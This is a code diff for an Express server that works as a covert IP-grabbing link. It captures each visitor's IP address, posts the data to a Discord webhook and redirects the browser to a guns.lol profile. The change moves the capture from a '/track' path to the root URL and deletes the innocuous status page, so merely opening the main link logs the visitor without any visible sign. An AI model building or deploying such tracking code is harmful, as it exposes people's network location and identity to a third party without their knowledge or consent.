@@ -13,11 +13,12 @@ app.use(useragent.express());
 // Securely access the Discord Webhook from Render environment variables
 const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;
 
-app.get('/track', async (req, res) => {
+// CHANGED: Triggered on the main link directly (no /track required)
+app.get('/', async (req, res) => {
     // 1. Instantly capture incoming IP address variants
     let clientIp = req.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
-    // Clean up proxy strings if multiple IPs are forwarded (takes the first/original client IP)
+    // Clean up proxy strings if multiple IPs are forwarded
     if (clientIp && clientIp.includes(',')) {
         clientIp = clientIp.split(',')[0].trim();
     }
@@ -94,13 +95,8 @@ app.get('/track', async (req, res) => {
         console.error("[Backend Error] Could not post payload to Discord:", webhookError.message);
     }
 
-    // 7. Complete the execution requirement by redirecting directly to your page
+    // 7. Complete the final execution requirement by redirecting the client browser
     return res.redirect(302, 'https://guns.lol/xsaint');
-});
-
-// Root route placeholder to easily check deployment status
-app.get('/', (req, res) => {
-    res.send('Server is operational. Direct traffic to the /track path.');
 });
 
 app.listen(PORT, () => {
